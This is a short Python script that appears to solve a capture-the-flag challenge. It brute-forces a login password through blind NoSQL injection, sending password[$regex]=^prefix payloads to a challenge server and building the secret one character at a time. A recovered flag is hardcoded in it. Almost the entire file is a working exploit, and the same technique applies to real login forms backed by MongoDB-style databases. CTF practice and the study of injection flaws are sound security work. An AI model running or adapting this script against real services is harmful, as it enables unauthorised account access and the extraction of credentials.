import requests
headers={'content-type': 'application/x-www-form-urlencoded'}

import string
alphas = string.printable

fin = False
find = False

password = "AIS3{Bl1nd-b4s3d r3gex n0sq1i\?! \(:3\[\_\_\_\]}"
# FLAG = 'AIS3{Bl1nd-b4s3d r3gex n0sq1i?! (:3[___]}'

while 1:
    for ch in alphas:
        if ch in ['&']:
            continue
        if ch in ['*', ' ', '+','.','?', '^', '$', '|', '&', '(', ')', '[', ']', '{', '}', '\\']:
            c = "\\" + ch
        else:
            c = ch
        print(c)
        username = 'admin'
        payload='username=%s&password[$regex]=^%s' % (username, password + c)
        r = requests.post("http://chals1.ais3.org:54088/login", data = payload, headers = headers, verify = False, allow_redirects = False)

        if 'Success' in r.text:
            print("Found one more char : %s" % (password+c))
            password += c
            if c == '}': 
                fin = True
            
            find = True
            print(password)
            break
    if not find:
        print("Fail :(")
        break
    find = False
    if fin:
        break
    break
print(password)

# Reference:
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection

